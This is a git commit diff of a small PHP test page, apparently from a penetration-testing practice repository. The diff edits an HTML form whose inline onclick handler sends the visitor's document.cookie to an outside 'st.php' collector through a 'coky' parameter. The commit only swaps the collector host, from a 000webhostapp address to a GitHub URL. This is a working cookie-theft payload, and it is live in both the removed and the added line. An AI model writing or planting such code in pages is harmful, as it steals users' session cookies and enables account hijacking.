bb0e97da9a7ac3b98c21ba32139785674efddb71
eshetie <fc.eshetie@gmail.com>
2019-10-07 05:40:31 -0700

    Update tester.php

--- tester.php
+++ tester.php
@@ -6,7 +6,7 @@ echo "<h1>Welcome to peneshe.com</h1>";
 <html>
 <body>
 <button onclick="">test on me</button>
-<form  onclick=document.location='https://four-part-beams.000webhostapp.com/st.php?coky='+document.cookie x="" method="post" enctype="multipart/form-data" name="form_comment" id="form_comment" target="forms_target">
+<form  onclick=document.location='https://github.com/eshetie/pen/blob/master/st.php?coky='+document.cookie x="" method="post" enctype="multipart/form-data" name="form_comment" id="form_comment" target="forms_target">
 
 this is from form
 </form>
